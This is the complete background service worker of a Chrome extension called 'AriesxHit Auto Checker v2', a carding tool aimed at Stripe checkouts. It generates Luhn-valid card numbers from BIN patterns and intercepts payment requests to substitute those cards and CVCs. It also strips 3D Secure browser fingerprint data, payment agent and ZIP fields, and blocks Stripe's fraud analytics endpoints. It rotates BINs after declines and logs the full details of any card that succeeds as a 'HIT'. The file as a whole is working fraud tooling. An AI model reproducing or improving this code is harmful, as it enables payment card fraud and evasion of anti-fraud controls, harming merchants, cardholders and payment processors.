// ===================================
// BACKGROUND.JS
// Main Service Worker - WebRequest API
// AriesxHit Auto Checker v2
// ===================================

// ==================== INLINE UTILITIES (Service Worker) ====================

const Formatters = {
  maskCardNumber(cardNumber) {
    const cleaned = String(cardNumber).replace(/\D/g, '');
    if (cleaned.length < 10) return cleaned;
    const first6 = cleaned.substring(0, 6);
    const last4 = cleaned.substring(cleaned.length - 4);
    return first6 + '******' + last4;
  },
  
  formatTime(date = new Date()) {
    const hours = String(date.getHours()).padStart(2, '0');
    const minutes = String(date.getMinutes()).padStart(2, '0');
    const seconds = String(date.getSeconds()).padStart(2, '0');
    return `${hours}:${minutes}:${seconds}`;
  }
};

// Card Generator (inline for service worker)
const CardGen = {
  generateFromBin(binInput) {
    if (!binInput) return null;
    
    binInput = binInput.trim();
    const parts = binInput.split('|');
    const binPattern = parts[0].trim();
    const expMonth = parts[1] ? parts[1].trim() : null;
    const expYear = parts[2] ? parts[2].trim() : null;
    const cvvPattern = parts[3] ? parts[3].trim() : null;

    let pattern = binPattern.replace(/[^0-9xX]/g, '');
    
    // Pad to 16 if only digits
    if (/^\d+$/.test(pattern) && pattern.length < 16) {
      pattern = pattern + 'x'.repeat(16 - pattern.length);
    }
    
    // Pad to at least 16
    if (pattern.length < 16) {
      pattern = pattern + 'x'.repeat(16 - pattern.length);
    }

    let cardNumber = '';
    for (let i = 0; i < pattern.length; i++) {
      const char = pattern[i];
      if (char.toLowerCase() === 'x') {
        cardNumber += Math.floor(Math.random() * 10).toString();
      } else {
        cardNumber += char;
      }
    }

    // Fix Luhn
    cardNumber = this.fixLuhn(cardNumber);

    const month = this.genMonth(expMonth);
    const year = this.genYear(expYear);
    const cvv = this.genCvv(cvvPattern);

    return { number: cardNumber, month, year, cvv };
  },

  fixLuhn(cardNumber) {
    const digits = cardNumber.split('').map(Number);
    const len = digits.length;
    
    let sum = 0;
    for (let i = 0; i < len - 1; i++) {
      let digit = digits[i];
      if ((len - 1 - i) % 2 === 1) {
        digit *= 2;
        if (digit > 9) digit -= 9;
      }
      sum += digit;
    }

    const checkDigit = (10 - (sum % 10)) % 10;
    return cardNumber.slice(0, -1) + checkDigit.toString();
  },

  genMonth(month) {
    if (month && /^\d{1,2}$/.test(month)) {
      const m = parseInt(month, 10);
      if (m >= 1 && m <= 12) {
        return m.toString().padStart(2, '0');
      }
    }
    return (Math.floor(Math.random() * 12) + 1).toString().padStart(2, '0');
  },

  genYear(year) {
    const currentYear = new Date().getFullYear();
    if (year && /^\d{2,4}$/.test(year)) {
      let y = parseInt(year, 10);
      if (y < 100) y += 2000;
      if (y >= currentYear) {
        return (y % 100).toString().padStart(2, '0');
      }
    }
    const randomYear = currentYear + Math.floor(Math.random() * 5) + 1;
    return (randomYear % 100).toString().padStart(2, '0');
  },

  genCvv(pattern) {
    if (pattern && /^\d{3,4}$/.test(pattern)) {
      return pattern;
    }
    let cvv = '';
    for (let i = 0; i < 3; i++) {
      cvv += Math.floor(Math.random() * 10).toString();
    }
    return cvv;
  },

  genRandomCvv() {
    return Math.floor(100 + Math.random() * 900).toString();
  }
};

// ==================== STATE MANAGEMENT ====================

let state = {
  autoHitActive: false,
  bypassActive: false,
  currentCard: null,
  cardList: [],
  cardIndex: 0,
  binList: [],        // Array of BIN patterns
  currentBinIndex: 0,
  proxy: null,
  logs: [],
  stats: { hits: 0, tested: 0, declined: 0 },
  permissions: null,
  settings: {
    cvcModifier: 'generate',  // 'remove', 'generate', 'nothing', 'custom'
    customCvc: '',
    remove3dsFingerprint: true,
    removePaymentAgent: false,
    removeZipCode: false,
    blockAnalytics: false
  },
  generatedCard: null,  // Card generated from BIN for current transaction
  checkoutDetectedTabs: new Set(),  // Tabs where we already showed notification
  is3dsDetectedTabs: new Set()       // Tabs with 3DS detected
};

// Tab state for tracking cards per tab
const tabState = new Map();

// ==================== INITIALIZATION ====================

// Load state from storage on startup
chrome.storage.local.get([
  'logs', 'stats', 'permissions', 
  'settings_cvcModifier', 'settings_customCvc', 
  'settings_remove3dsFingerprint', 'settings_removePaymentAgent',
  'settings_removeZipCode', 'settings_blockAnalytics',
  'current_bin_list'
], (result) => {
  if (result.logs) state.logs = result.logs;
  if (result.stats) state.stats = result.stats;
  if (result.permissions) state.permissions = result.permissions;
  
  // Load settings
  if (result.settings_cvcModifier) state.settings.cvcModifier = result.settings_cvcModifier;
  if (result.settings_customCvc) state.settings.customCvc = result.settings_customCvc;
  if (result.settings_remove3dsFingerprint !== undefined) state.settings.remove3dsFingerprint = result.settings_remove3dsFingerprint;
  if (result.settings_removePaymentAgent !== undefined) state.settings.removePaymentAgent = result.settings_removePaymentAgent;
  if (result.settings_removeZipCode !== undefined) state.settings.removeZipCode = result.settings_removeZipCode;
  if (result.settings_blockAnalytics !== undefined) state.settings.blockAnalytics = result.settings_blockAnalytics;
  if (result.current_bin_list) state.binList = result.current_bin_list;
  
  console.log('[Background] Loaded settings:', state.settings);
});

// Open in new tab when extension icon is clicked
chrome.action.onClicked.addListener(async () => {
  const tabs = await chrome.tabs.query({ url: chrome.runtime.getURL('popup.html') });
  
  if (tabs.length > 0) {
    chrome.tabs.update(tabs[0].id, { active: true });
    chrome.windows.update(tabs[0].windowId, { focused: true });
  } else {
    const authData = await chrome.storage.local.get(['auth_token', 'user_data']);
    if (authData.auth_token && authData.user_data) {
      chrome.tabs.create({ url: chrome.runtime.getURL('popup.html') });
    } else {
      chrome.tabs.create({ url: chrome.runtime.getURL('login.html') });
    }
  }
});

// ==================== WEBREQUEST API INTERCEPTION ====================

// URLs to intercept
const STRIPE_PATTERNS = [
  '*://api.stripe.com/*',
  '*://*.stripe.com/v1/*',
  '*://js.stripe.com/*'
];

// Blocked analytics URLs
const ANALYTICS_PATTERNS = [
  '*://r.stripe.com/*',
  '*://m.stripe.com/*',
  '*://q.stripe.com/*'
];

// Listen for requests before they're sent
chrome.webRequest.onBeforeRequest.addListener(
  (details) => {
    // Block analytics if enabled
    if (state.settings.blockAnalytics) {
      for (const pattern of ANALYTICS_PATTERNS) {
        if (matchesPattern(details.url, pattern)) {
          console.log('[WebRequest] Blocked analytics:', details.url);
          return { cancel: true };
        }
      }
    }

    // Only process POST requests with body
    if (details.method !== 'POST' || !details.requestBody) {
      return {};
    }

    // Check if it's a Stripe payment request
    if (!isStripePaymentRequest(details.url)) {
      return {};
    }

    // Get the request body
    const body = getRequestBody(details.requestBody);
    if (!body) return {};

    // Detect checkout type (2D or 3D)
    const is3ds = detect3dsRequest(body);
    if (is3ds && !state.is3dsDetectedTabs.has(details.tabId)) {
      state.is3dsDetectedTabs.add(details.tabId);
      notifyTab(details.tabId, {
        type: 'SHOW_3DS_NOTIFICATION',
        message: '🔒 3D Secure Detected'
      });
      addLog({ type: 'warning', message: '🔒 3D Secure checkout detected', timestamp: Date.now() });
    }

    // Process and modify the request
    const processed = processPaymentRequest(body, details.url, details.tabId);
    
    if (processed.modified) {
      addLog({ 
        type: 'info', 
        message: `🔧 Modified request: ${processed.info.action}`, 
        timestamp: Date.now() 
      });
      
      // Return modified form data
      return {
        requestBody: {
          formData: processed.formData
        }
      };
    }

    return {};
  },
  { urls: ['<all_urls>'] },
  ['blocking', 'requestBody']
);

// Listen for response headers to detect Stripe
chrome.webRequest.onHeadersReceived.addListener(
  (details) => {
    // Detect Stripe checkout pages
    if (details.url.includes('checkout.stripe.com') || 
        details.url.includes('buy.stripe.com') ||
        details.url.includes('invoice.stripe.com')) {
      
      if (!state.checkoutDetectedTabs.has(details.tabId)) {
        state.checkoutDetectedTabs.add(details.tabId);
        
        // Send notification to content script
        setTimeout(() => {
          notifyTab(details.tabId, {
            type: 'SHOW_STRIPE_CHECKOUT_NOTIFICATION'
          });
        }, 1000);
        
        addLog({ type: 'success', message: '🔍 Stripe Checkout Detected', timestamp: Date.now() });
      }
    }
    
    return {};
  },
  { urls: ['<all_urls>'] },
  ['responseHeaders']
);

// ==================== REQUEST PROCESSING ====================

function isStripePaymentRequest(url) {
  return url.includes('stripe.com/v1/payment_methods') ||
         url.includes('stripe.com/v1/tokens') ||
         url.includes('stripe.com/v1/sources') ||
         url.includes('stripe.com/v1/payment_intents') && url.includes('confirm');
}

function getRequestBody(requestBody) {
  if (!requestBody) return null;
  
  if (requestBody.formData) {
    // Convert formData object to URLSearchParams string
    const params = new URLSearchParams();
    for (const [key, values] of Object.entries(requestBody.formData)) {
      for (const value of values) {
        params.append(key, value);
      }
    }
    return params.toString();
  }
  
  if (requestBody.raw && requestBody.raw.length > 0) {
    const decoder = new TextDecoder('utf-8');
    let body = '';
    for (const part of requestBody.raw) {
      body += decoder.decode(part.bytes);
    }
    return body;
  }
  
  return null;
}

function detect3dsRequest(body) {
  return body.includes('three_d_secure') || 
         body.includes('3ds') || 
         body.includes('authenticate');
}

function processPaymentRequest(body, url, tabId) {
  const params = new URLSearchParams(body);
  let modified = false;
  let info = { action: [] };

  // === CARD SUBSTITUTION (when Bypass is active and BIN is set) ===
  if (state.bypassActive && state.binList.length > 0) {
    const result = substituteCard(params, tabId);
    if (result.modified) {
      modified = true;
      info.action.push(`Card: ${result.maskedCard}`);
    }
  }

  // === CVC MODIFICATION ===
  const cvcResult = modifyCvc(params);
  if (cvcResult.modified) {
    modified = true;
    info.action.push(`CVC: ${cvcResult.action}`);
  }

  // === 3D SECURE FINGERPRINT BYPASS ===
  if (state.settings.remove3dsFingerprint) {
    const threeDsResult = bypass3dsFingerprint(params);
    if (threeDsResult.modified) {
      modified = true;
      info.action.push('3DS fingerprint removed');
    }
  }

  // === REMOVE PAYMENT AGENT ===
  if (state.settings.removePaymentAgent) {
    const agentResult = removePaymentAgent(params);
    if (agentResult.modified) {
      modified = true;
      info.action.push('Agent removed');
    }
  }

  // === REMOVE ZIP CODE ===
  if (state.settings.removeZipCode) {
    const zipResult = removeZipCode(params);
    if (zipResult.modified) {
      modified = true;
      info.action.push('ZIP removed');
    }
  }

  // Convert URLSearchParams back to formData format
  const formData = {};
  for (const [key, value] of params) {
    if (!formData[key]) formData[key] = [];
    formData[key].push(value);
  }

  info.action = info.action.join(', ') || 'none';
  return { modified, formData, info };
}

function substituteCard(params, tabId) {
  // Check if card data exists
  const hasCard = params.has('card[number]') || 
                  params.has('payment_method_data[card][number]');
  
  if (!hasCard) return { modified: false };

  // Get BIN and generate card
  const bin = state.binList[state.currentBinIndex % state.binList.length];
  if (!bin) return { modified: false };

  // Generate card from BIN
  const card = CardGen.generateFromBin(bin);
  if (!card) return { modified: false };

  // Store generated card for this transaction
  state.generatedCard = card;
  
  // Track card for this tab
  const tabInfo = tabState.get(tabId) || { tested: 0 };
  tabInfo.currentCard = card;
  tabInfo.tested++;
  tabState.set(tabId, tabInfo);

  // Update stats
  state.stats.tested++;
  chrome.storage.local.set({ stats: state.stats });

  // Replace card number
  if (params.has('card[number]')) {
    params.set('card[number]', card.number);
  }
  if (params.has('payment_method_data[card][number]')) {
    params.set('payment_method_data[card][number]', card.number);
  }

  // Replace expiry
  if (params.has('card[exp_month]')) {
    params.set('card[exp_month]', card.month);
  }
  if (params.has('card[exp_year]')) {
    params.set('card[exp_year]', card.year);
  }
  if (params.has('payment_method_data[card][exp_month]')) {
    params.set('payment_method_data[card][exp_month]', card.month);
  }
  if (params.has('payment_method_data[card][exp_year]')) {
    params.set('payment_method_data[card][exp_year]', card.year);
  }

  // Get CVC modifier name for logging
  const cvcModifierNames = {
    'remove': 'Remove',
    'generate': 'Generate', 
    'nothing': 'Nothing',
    'custom': 'Custom'
  };
  const cvcModeName = cvcModifierNames[state.settings.cvcModifier] || state.settings.cvcModifier;

  // Log the card being used with modifier info
  const fullCard = `${card.number}|${card.month}|${card.year}|${card.cvv}`;
  addLog({ 
    type: 'info', 
    message: `💳 ${fullCard} (gen) [CVC: ${cvcModeName}]`, 
    timestamp: Date.now() 
  });

  return { modified: true, maskedCard: Formatters.maskCardNumber(card.number), fullCard };
}

function modifyCvc(params) {
  const cvcKeys = ['card[cvc]', 'payment_method_data[card][cvc]', 'source[card][cvc]'];
  let modified = false;
  let action = '';

  for (const key of cvcKeys) {
    if (params.has(key)) {
      switch (state.settings.cvcModifier) {
        case 'remove':
          params.delete(key);
          action = 'removed';
          modified = true;
          break;

        case 'generate':
          const newCvc = state.generatedCard?.cvv || CardGen.genRandomCvv();
          params.set(key, newCvc);
          action = `generated (${newCvc})`;
          modified = true;
          break;

        case 'custom':
          if (state.settings.customCvc) {
            params.set(key, state.settings.customCvc);
            action = `custom (${state.settings.customCvc})`;
            modified = true;
          }
          break;

        case 'nothing':
        default:
          action = 'unchanged';
          break;
      }
    }
  }

  return { modified, action };
}

function bypass3dsFingerprint(params) {
  // Look for three_d_secure[device_data]
  let deviceDataKey = null;
  let deviceDataValue = null;

  for (const [key, value] of params) {
    if (key.includes('three_d_secure') && key.includes('device_data')) {
      deviceDataKey = key;
      deviceDataValue = value;
      break;
    }
  }

  if (!deviceDataKey || !deviceDataValue) {
    return { modified: false };
  }

  try {
    // Decode: URL decode -> Base64 decode -> JSON parse
    let decoded = decodeURIComponent(deviceDataValue);
    let jsonStr = atob(decoded);
    let obj = JSON.parse(jsonStr);

    // Remove fingerprint fields
    delete obj.browser_locale;
    delete obj.timezone;
    delete obj.user_agent;
    delete obj.screen_width;
    delete obj.screen_height;
    delete obj.color_depth;
    delete obj.language;
    delete obj.java_enabled;
    delete obj.javascript_enabled;
    delete obj.time_zone;

    // Re-encode: JSON stringify -> Base64 encode -> URL encode
    let newJson = JSON.stringify(obj);
    let newBase64 = btoa(newJson);
    let newEncoded = encodeURIComponent(newBase64);

    params.set(deviceDataKey, newEncoded);
    
    console.log('[Background] 3DS fingerprint removed');
    return { modified: true };
  } catch (e) {
    console.error('[Background] Failed to process 3DS data:', e);
    return { modified: false };
  }
}

function removePaymentAgent(params) {
  const agentKeys = [
    'payment_user_agent',
    'referrer',
    'client_attribution_metadata[client_session_id]',
    'client_attribution_metadata[merchant_integration_source]',
    'client_attribution_metadata[merchant_integration_subtype]',
    'client_attribution_metadata[merchant_integration_version]'
  ];

  let modified = false;
  for (const key of agentKeys) {
    if (params.has(key)) {
      params.delete(key);
      modified = true;
    }
  }

  return { modified };
}

function removeZipCode(params) {
  const zipKeys = [
    'billing_details[address][postal_code]',
    'card[address_zip]',
    'payment_method_data[billing_details][address][postal_code]'
  ];

  let modified = false;
  for (const key of zipKeys) {
    if (params.has(key)) {
      params.delete(key);
      modified = true;
    }
  }

  return { modified };
}

function matchesPattern(url, pattern) {
  const regexPattern = pattern
    .replace(/\*/g, '.*')
    .replace(/\?/g, '.');
  return new RegExp(regexPattern).test(url);
}

// ==================== PERMISSION CHECKS ====================

async function checkPermission(feature) {
  const permissions = await chrome.storage.local.get('permissions');
  if (!permissions || !permissions.permissions) {
    return false;
  }
  return permissions.permissions[feature] === true;
}

// ==================== MESSAGE HANDLING ====================

chrome.runtime.onMessage.addListener((message, sender, sendResponse) => {
  handleMessage(message, sender, sendResponse);
  return true;
});

async function handleMessage(message, sender, sendResponse) {
  console.log('[Background] Message:', message.type);

  switch (message.type) {
    case 'START_AUTO_HIT':
      await handleStartAutoHit(message.data, sendResponse);
      break;

    case 'STOP_AUTO_HIT':
      handleStopAutoHit(sendResponse);
      break;

    case 'START_BYPASS':
      await handleStartBypass(message.data, sendResponse);
      break;

    case 'STOP_BYPASS':
      handleStopBypass(sendResponse);
      break;

    case 'UPDATE_SETTINGS':
      handleUpdateSettings(message.settings, sendResponse);
      break;

    case 'GET_SETTINGS':
      sendResponse({ settings: state.settings });
      break;

    case 'SET_BIN_LIST':
      handleSetBinList(message.bins, sendResponse);
      break;

    case 'GET_LOGS':
      sendResponse({ logs: state.logs, stats: state.stats });
      break;

    case 'ADD_LOG':
      addLog(message.log);
      sendResponse({ success: true });
      break;

    case 'CLEAR_LOGS':
      clearLogs();
      sendResponse({ success: true });
      break;

    case 'GET_STATS':
      sendResponse(state.stats);
      break;

    case 'GET_AUTO_HIT_STATE':
      sendResponse({ active: state.autoHitActive });
      break;

    case 'GET_BYPASS_STATE':
      sendResponse({ active: state.bypassActive });
      break;

    case 'STRIPE_RESPONSE':
      handleStripeResponse(message.result, sender.tab?.id);
      sendResponse({ success: true });
      break;

    case 'SUCCESS_PAGE_DETECTED':
      handleSuccessDetected(message.url, sender.tab?.id);
      sendResponse({ success: true });
      break;

    case 'CHECKOUT_DETECTED':
      handleCheckoutDetected(sender.tab?.id);
      sendResponse({ success: true });
      break;

    case '3DS_DETECTED':
      handle3dsDetected(sender.tab?.id);
      sendResponse({ success: true });
      break;

    default:
      sendResponse({ error: 'Unknown message type' });
  }
}

// ==================== AUTO HIT ====================

async function handleStartAutoHit(data, sendResponse) {
  const hasPermission = await checkPermission('auto_hit');
  if (!hasPermission) {
    addLog({ type: 'error', message: '⛔ Access Denied: Auto Hit permission required', timestamp: Date.now() });
    sendResponse({ success: false, error: 'NO_PERMISSION' });
    return;
  }

  if (!data.cards || data.cards.length === 0) {
    sendResponse({ success: false, error: 'No cards provided' });
    return;
  }

  state.autoHitActive = true;
  state.cardList = data.cards;
  state.cardIndex = 0;

  addLog({ type: 'success', message: `🚀 Auto Hit started with ${data.cards.length} cards`, timestamp: Date.now() });
  sendResponse({ success: true });

  broadcastToPopup({ type: 'MODE_UPDATE', mode: 'Auto Hit Active' });
}

function handleStopAutoHit(sendResponse) {
  state.autoHitActive = false;
  state.cardList = [];
  state.cardIndex = 0;

  addLog({ type: 'info', message: '⏹️ Auto Hit stopped', timestamp: Date.now() });
  sendResponse({ success: true });

  broadcastToPopup({ type: 'MODE_UPDATE', mode: 'Idle' });
}

// ==================== BYPASS MODE ====================

async function handleStartBypass(data, sendResponse) {
  const hasPermission = await checkPermission('bypass');
  if (!hasPermission) {
    addLog({ type: 'error', message: '⛔ Access Denied: Bypass permission required', timestamp: Date.now() });
    sendResponse({ success: false, error: 'NO_PERMISSION' });
    return;
  }

  state.bypassActive = true;
  
  // Set BIN list if provided
  if (data?.bins) {
    state.binList = data.bins;
    state.currentBinIndex = 0;
    chrome.storage.local.set({ current_bin_list: data.bins });
  }

  addLog({ type: 'success', message: `🔓 Bypass mode enabled (CVC: ${state.settings.cvcModifier})`, timestamp: Date.now() });
  
  // Notify all tabs
  chrome.tabs.query({}, (tabs) => {
    tabs.forEach(tab => {
      chrome.tabs.sendMessage(tab.id, {
        type: 'SET_BYPASS_STATE',
        active: true,
        settings: state.settings
      }).catch(() => {});
    });
  });

  sendResponse({ success: true });
}

function handleStopBypass(sendResponse) {
  state.bypassActive = false;
  state.generatedCard = null;
  
  addLog({ type: 'info', message: '⏹️ Bypass mode disabled', timestamp: Date.now() });
  
  chrome.tabs.query({}, (tabs) => {
    tabs.forEach(tab => {
      chrome.tabs.sendMessage(tab.id, {
        type: 'SET_BYPASS_STATE',
        active: false
      }).catch(() => {});
    });
  });

  sendResponse({ success: true });
}

// ==================== SETTINGS ====================

function handleUpdateSettings(newSettings, sendResponse) {
  Object.assign(state.settings, newSettings);
  
  // Save to storage
  const toStore = {};
  Object.keys(newSettings).forEach(key => {
    toStore[`settings_${key}`] = newSettings[key];
  });
  chrome.storage.local.set(toStore);
  
  addLog({ type: 'info', message: `⚙️ Settings updated: CVC ${state.settings.cvcModifier}`, timestamp: Date.now() });
  sendResponse({ success: true });
}

function handleSetBinList(bins, sendResponse) {
  if (typeof bins === 'string') {
    state.binList = bins.split('\n').map(b => b.trim()).filter(b => b.length >= 6);
  } else if (Array.isArray(bins)) {
    state.binList = bins;
  }
  
  state.currentBinIndex = 0;
  chrome.storage.local.set({ current_bin_list: state.binList });
  
  addLog({ type: 'info', message: `📋 BIN list updated: ${state.binList.length} patterns`, timestamp: Date.now() });
  sendResponse({ success: true, count: state.binList.length });
}

// ==================== RESPONSE HANDLING ====================

function handleStripeResponse(result, tabId) {
  if (!result) return;

  const tabInfo = tabState.get(tabId);
  const card = tabInfo?.currentCard;

  // Log the gateway response
  if (result.needsAction) {
    addLog({ type: 'warning', message: `🔐 Stripe: 3D Secure Required`, timestamp: Date.now() });
  } else if (result.success) {
    addLog({ type: 'success', message: `✅ Stripe: Payment Successful`, timestamp: Date.now() });
    handleSuccess(tabId, card);
  } else if (result.code || result.message) {
    const responseMsg = result.code || result.message || 'Unknown Error';
    addLog({ type: 'error', message: `❌ Stripe: ${responseMsg}`, timestamp: Date.now() });
    handleDecline(tabId, card, result);
  }
}

function handleSuccess(tabId, card) {
  const cardString = card ? `${card.number}|${card.month}|${card.year}|${card.cvv}` : '';

  // Log HIT DETECTED below the response
  addLog({ type: 'success', message: `🎉 HIT DETECTED`, timestamp: Date.now() });
  addLog({ type: 'success', message: `💎 ${cardString}`, timestamp: Date.now() });
  
  state.stats.hits++;

  // Stop modes
  state.autoHitActive = false;
  state.bypassActive = false;
  state.generatedCard = null;

  // Notify tab
  notifyTab(tabId, {
    type: 'SHOW_SUCCESS_NOTIFICATION',
    message: '🎉 Payment Success!',
    card: cardString
  });

  broadcastToPopup({ type: 'STATS_UPDATE', hits: state.stats.hits });
  broadcastToPopup({ type: 'MODE_UPDATE', mode: 'HIT!' });

  chrome.storage.local.set({ stats: state.stats });
}

function handleDecline(tabId, card, result) {
  state.stats.declined++;

  // Move to next BIN in list
  state.currentBinIndex++;
  
  // Notify for retry
  if (state.bypassActive || state.autoHitActive) {
    notifyTab(tabId, {
      type: 'SHOW_DECLINE_NOTIFICATION',
      message: `❌ ${result.code || 'Declined'}`,
      shouldRetry: true
    });
  }

  chrome.storage.local.set({ stats: state.stats });
}

function handleSuccessDetected(url, tabId) {
  addLog({ type: 'success', message: `🎉 Success page: ${url}`, timestamp: Date.now() });
  handleSuccess(tabId, state.generatedCard);
}

function handleCheckoutDetected(tabId) {
  if (!state.checkoutDetectedTabs.has(tabId)) {
    state.checkoutDetectedTabs.add(tabId);
    addLog({ type: 'info', message: '🔍 Stripe Checkout Detected', timestamp: Date.now() });
  }
}

function handle3dsDetected(tabId) {
  if (!state.is3dsDetectedTabs.has(tabId)) {
    state.is3dsDetectedTabs.add(tabId);
    addLog({ type: 'warning', message: '🔒 3D Secure Detected', timestamp: Date.now() });
  }
}

// ==================== LOGGING ====================

function addLog(log) {
  state.logs.push(log);

  if (state.logs.length > 500) {
    state.logs.shift();
  }

  chrome.storage.local.set({ logs: state.logs });

  broadcastToPopup({
    type: 'LOG_UPDATE',
    logType: log.type,
    message: log.message
  });
}

function clearLogs() {
  state.logs = [];
  chrome.storage.local.set({ logs: [] });
}

// ==================== UTILITIES ====================

function broadcastToPopup(message) {
  chrome.runtime.sendMessage(message).catch(() => {});
}

function notifyTab(tabId, message) {
  if (!tabId) return;
  chrome.tabs.sendMessage(tabId, message).catch(() => {});
}

// Clean up on tab close
chrome.tabs.onRemoved.addListener((tabId) => {
  tabState.delete(tabId);
  state.checkoutDetectedTabs.delete(tabId);
  state.is3dsDetectedTabs.delete(tabId);
});

// Clean up on navigation
chrome.tabs.onUpdated.addListener((tabId, changeInfo) => {
  if (changeInfo.status === 'loading') {
    state.checkoutDetectedTabs.delete(tabId);
    state.is3dsDetectedTabs.delete(tabId);
  }
});

console.log('AriesxHit Background Service Worker - WebRequest API Ready');
